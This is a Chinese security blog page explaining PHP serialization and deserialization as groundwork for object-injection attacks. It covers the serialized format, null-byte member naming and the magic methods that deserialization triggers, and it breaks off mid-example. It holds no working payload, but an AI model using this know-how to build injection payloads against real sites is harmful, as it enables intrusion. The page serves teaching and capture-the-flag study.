<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>序列化与反序列化 | 忆 执 昔 来 的 旅 途</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="序列化与反序列化" />
  
  
  
  
  <meta name="description" content="[TOC] 序列化与反序列化 序列化：持久保存，网络传输 序列化是将对象状态转换为可保持或可传输的格式的过程（对象转换为字符串）。与序列化相对的是反序列化，它将流转换为对象（字符串转换为对象）。这两个过程结合起来，可以轻松地存储和传输数据 本质上就是对于数据格式的一种转换  常见的序列化格式：  二进制格式 字节数组 json 字符串 xml 字符串   理解：在程序执行结束时，内存数据便会立即销">
<meta property="og:type" content="article">
<meta property="og:title" content="序列化与反序列化">
<meta property="og:url" content="https://xizhi-future.github.io/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="忆 执 昔 来 的 旅 途">
<meta property="og:description" content="[TOC] 序列化与反序列化 序列化：持久保存，网络传输 序列化是将对象状态转换为可保持或可传输的格式的过程（对象转换为字符串）。与序列化相对的是反序列化，它将流转换为对象（字符串转换为对象）。这两个过程结合起来，可以轻松地存储和传输数据 本质上就是对于数据格式的一种转换  常见的序列化格式：  二进制格式 字节数组 json 字符串 xml 字符串   理解：在程序执行结束时，内存数据便会立即销">
<meta property="og:locale">
<meta property="og:image" content="https://i.loli.net/2021/09/15/IWPycor6sQ9nYL7.png">
<meta property="og:image" content="https://i.loli.net/2021/09/10/qVYPWyw4pl1ITsJ.png">
<meta property="og:image" content="https://i.loli.net/2021/09/15/3JxYcWU6D2tlKOn.png">
<meta property="og:image" content="https://i.loli.net/2021/09/10/NS5xRa8hUD7rvXI.png">
<meta property="og:image" content="https://i.loli.net/2021/09/10/g1OCJhFiYa7s8yk.png">
<meta property="og:image" content="https://i.loli.net/2021/09/10/XohASq2FvtG3Q4C.png">
<meta property="og:image" content="https://i.loli.net/2021/09/10/zupN4kL8dmvtAEK.png">
<meta property="og:image" content="https://i.loli.net/2021/09/10/ZmtHakew1TCRDVr.png">
<meta property="og:image" content="https://i.loli.net/2021/06/12/wOtFRIT7QracXNJ.png">
<meta property="og:image" content="https://i.loli.net/2021/06/12/yp5auIfPciTKWe3.png">
<meta property="og:image" content="https://i.loli.net/2021/06/12/yedxVQwtYGucfm3.png">
<meta property="og:image" content="https://i.loli.net/2021/06/12/duJgi58ZpxNOwQk.png">
<meta property="og:image" content="https://i.loli.net/2021/06/13/Wd1MD8Af4JGy2pe.png">
<meta property="og:image" content="https://i.loli.net/2021/06/13/Na6dklr1qA8v2Yo.png">
<meta property="og:image" content="https://i.loli.net/2021/06/13/zjiFCvMSHx7PDdO.png">
<meta property="og:image" content="https://i.loli.net/2021/06/13/ZhFTAEVcpUiew78.png">
<meta property="og:image" content="https://i.loli.net/2021/06/13/cjrJVkIPAGnb1To.png">
<meta property="og:image" content="https://i.loli.net/2021/06/13/dbMkafNKIsSPulh.png">
<meta property="og:image" content="https://i.loli.net/2021/06/13/LroXScDCuzgTatf.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/Iv3lNjUXtFoZpcw.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/ROTrMWvjBeo1pmK.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/zHR9QuMXmZEYaSO.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/fIErdgbOZQ3Gs7t.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png">
<meta property="og:image" content="https://i.loli.net/2021/09/10/ev7ay5QxkIJBdtG.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/dOqcxFjsStoZmlM.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/FAST5wPB3aQu2IE.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/8q7iuL96Xj4CeSg.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/YRJEP4uIzharXQM.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/pZsvBjrJdhXlWcM.png">
<meta property="og:image" content="https://i.loli.net/2021/09/12/VwE3NXjsbhq5KoJ.png">
<meta property="og:image" content="https://i.loli.net/2021/09/12/TNsWVOG8L9oZwQ3.png">
<meta property="og:image" content="https://i.loli.net/2021/09/12/ARNKoeV6fZXclxU.png">
<meta property="og:image" content="https://i.loli.net/2021/09/12/CVnR1U5O6mioqtc.png">
<meta property="og:image" content="https://i.loli.net/2021/09/12/9BrpshRMXJCjGUz.png">
<meta property="og:image" content="https://i.loli.net/2021/09/15/bMn8ex1dK7QRVPD.png">
<meta property="og:image" content="https://i.loli.net/2021/09/15/jJ5y4FCiGpXvRWZ.png">
<meta property="og:image" content="https://i.loli.net/2021/09/15/3iUZ8msAvRtHIjb.png">
<meta property="article:published_time" content="2021-10-07T10:10:26.000Z">
<meta property="article:modified_time" content="2021-10-07T10:11:19.031Z">
<meta property="article:author" content="xizhi-future">
<meta property="article:tag" content="序列化与反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/09/15/IWPycor6sQ9nYL7.png">
  
    <link rel="alternate" href="/atom.xml" title="忆 执 昔 来 的 旅 途" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
}

  </style>
  
<link rel="stylesheet" href="/css/style.css">


  
<script src="/js/jquery-3.1.1.min.js"></script>

  
<script src="/js/bootstrap.js"></script>


  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    
<link rel="stylesheet" href="/css/dialog.css">

  

  

  
    <link rel="stylesheet" href="/css/header-post.css" >
  

  
  
  
    <link rel="stylesheet" href="/css/vdonate.css" >
  

<meta name="generator" content="Hexo 5.4.0"></head>



  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  <div id="container">
    <div id="wrap">
      
        <header>

    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
        <div class="navbar-inner">
          
          <div class="container"> 
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
              <span class="sr-only">Toggle navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>

            
              <a class="brand" style="
                 margin-top: 0px;"  
                href="#" data-toggle="modal" data-target="#myModal" >
                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
              </a>
            
            
            <div class="navbar-collapse collapse">
              <ul class="hnav navbar-nav">
                
                  <li> <a class="main-nav-link" href="/">Home</a> </li>
                
                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
                
                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
                
                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
                
                  <li> <a class="main-nav-link" href="/essayists">随笔</a> </li>
                
                  <li> <a class="main-nav-link" href="/about">About</a> </li>
                
                  <li><div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="" />
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..." />
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>


</div></li>
            </div>
          </div>
                
      </div>
    </div>

</header>



      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-序列化与反序列化" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      序列化与反序列化
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
	  <time datetime="2021-10-07T10:10:26.000Z" itemprop="datePublished">2021-10-07</time>
	</a>

      
    <a class="article-category-link" href="/categories/WEB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/">WEB漏洞详解</a>

      
	<a class="article-views">
	<span id="busuanzi_container_page_pv">
		PV:<span id="busuanzi_value_page_pv"></span>
	</span>
	</a>

      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>[TOC]</p>
<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><blockquote>
<p>序列化：持久保存，网络传输</p>
<p>序列化是将对象状态转换为可保持或可传输的格式的过程（对象转换为字符串）。与序列化相对的是反序列化，它将流转换为对象（字符串转换为对象）。这两个过程结合起来，可以轻松地存储和传输数据</p>
<p>本质上就是对于数据格式的一种转换</p>
</blockquote>
<p><strong>常见的序列化格式：</strong></p>
<ul>
<li>二进制格式</li>
<li>字节数组</li>
<li>json 字符串</li>
<li>xml 字符串</li>
</ul>
<p><img src="https://i.loli.net/2021/09/15/IWPycor6sQ9nYL7.png" alt="image-20210504114814092"></p>
<p>理解：在程序执行结束时，内存数据便会立即销毁，变量所储存的数据便是内存数据，而文件、数据库是“持久数据”，因此<strong>PHP序列化就是将内存的变量数据“保存”到文件中的持久数据的过程。</strong></p>
<h1 id="一、-PHP-反序列化"><a href="#一、-PHP-反序列化" class="headerlink" title="一、 PHP 反序列化"></a>一、 PHP 反序列化</h1><h2 id="1-1-格式"><a href="#1-1-格式" class="headerlink" title="1.1 格式"></a>1.1 格式</h2><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码注入，SQL注入等危害。</p>
<p>当进行反序列化的过程中就会自动触发某些魔术方法。</p>
<p><strong>涉及函数：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()		<span class="comment">//序列化：将一个对象转换为一个字符串</span></span><br><span class="line">unserialize()	<span class="comment">//反序列化：将一个字符串还原为一个对象</span></span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;qww&quot;</span>;</span><br><span class="line"><span class="comment">//$test = 123;</span></span><br><span class="line"><span class="comment">//$test = true;</span></span><br><span class="line"><span class="variable">$test</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//s:3:&quot;qww&quot;;</span></span><br><span class="line"><span class="comment">//i:123;    </span></span><br><span class="line"><span class="comment">//b:1;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&#x27;s:3:&quot;qww&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//qww </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$user</span>=array(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=serialize(<span class="variable">$user</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$user</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">print_r(unserialize(<span class="variable">$user</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/10/qVYPWyw4pl1ITsJ.png" alt="image-20210910165634478"></p>
<p><strong>格式：</strong></p>
<p><img src="https://i.loli.net/2021/09/15/3JxYcWU6D2tlKOn.png" alt="image-20210504120450323"></p>
<p><strong>序列化与反序列化 字母表示：</strong></p>
<table>
<thead>
<tr>
<th align="center">a</th>
<th align="center">array数组</th>
</tr>
</thead>
<tbody><tr>
<td align="center">b</td>
<td align="center">boolean判断类型</td>
</tr>
<tr>
<td align="center">d</td>
<td align="center">double浮点数</td>
</tr>
<tr>
<td align="center">i</td>
<td align="center">integer整数型</td>
</tr>
<tr>
<td align="center">o</td>
<td align="center">common object 一般的对象</td>
</tr>
<tr>
<td align="center">r</td>
<td align="center">reference引用类型</td>
</tr>
<tr>
<td align="center">s</td>
<td align="center">string字符串类型</td>
</tr>
<tr>
<td align="center">C</td>
<td align="center">custom object</td>
</tr>
<tr>
<td align="center">O</td>
<td align="center">class</td>
</tr>
<tr>
<td align="center">N</td>
<td align="center">null</td>
</tr>
<tr>
<td align="center">R</td>
<td align="center">pointer reference</td>
</tr>
<tr>
<td align="center">U</td>
<td align="center">unicode string</td>
</tr>
</tbody></table>
<h2 id="1-2-特性"><a href="#1-2-特性" class="headerlink" title="1.2 特性"></a>1.2 特性</h2><ul>
<li><p><strong>所有 php 中的值都可以使用 serialize()  来返回一个包含字节流的字符串表示</strong></p>
</li>
<li><p><strong>序列化之后的内容只有成员变量，没有成员函数，即方法</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;<span class="variable">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">happy</span></span>()&#123;<span class="built_in">return</span> <span class="variable">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new <span class="built_in">test</span>();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/10/NS5xRa8hUD7rvXI.png" alt="image-20210910170119999"></p>
</li>
<li><p><strong>三种变量类型的差异：</strong></p>
<p>变量前是 <strong>protected</strong>，则会在变量名前加上<code>\x00*\x00</code> , <strong>private</strong> 则会在变量名前加上<code>\x00类名\x00</code>，<code>\x00字段名\x00</code>，输出时一般需要url编码，若在本地存储推荐采用base64编码的形式。</p>
<ul>
<li><p><strong>public  正常输出</strong></p>
</li>
<li><p><strong>Private 所声明的私有变量</strong> 只能在所声明的类中可见，在该类的子类以及该类的对象中均不可见。所以私有变量在序列化时，类名和字段名前面都会加上 <code>%00</code> ，即 ascii 为0的字符（不可见字符）；</p>
</li>
<li><p><strong>Protected 所声明受保护类型的变量</strong> 序列化时会有 <code>%00*%00</code> 字符；</p>
</li>
</ul>
<p><strong>测试一：public</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试二：private</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">15</span>:<span class="string">&quot;FileHandlerop&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;FileHandlerfilename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;FileHandlercontent&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实际上是</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">15</span>:<span class="string">&quot;%00FileHandler%00op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;%00FileHandler%00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;%00FileHandler%00content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试三：protected</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;*op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;*filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;*content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>实际上是输出导致了不可见字符 <code>\x00</code> 的丢失</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实际上是</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;%00*%00op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;%00*%00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;%00*%00content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="1-3-php-反序列化的触发"><a href="#1-3-php-反序列化的触发" class="headerlink" title="1.3 php 反序列化的触发"></a>1.3 php 反序列化的触发</h2><p><strong>触发条件：</strong></p>
<p>unserialize() 函数 的变量可控，文件当中存在可利用的类，类中存在魔术方法</p>
<p><strong>常见魔术方法：魔术方法就是 php 在进行有关类中变量序列化以及反序列化相关操作是会自动被调用的一些方法（函数）</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发 </span></span><br><span class="line">__sleep() 	<span class="comment">//使用serialize时触发 </span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call()    <span class="comment">//在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发 </span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据 </span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性 </span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发 </span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把 一个对象 当作 字符串 使用时触发 </span></span><br><span class="line">    		<span class="comment">//例如：echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php">其它魔术方法</a></p>
<p>理解魔术方法的调用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr1</span>=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr2</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> test();  <span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;echoP();   <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;    <span 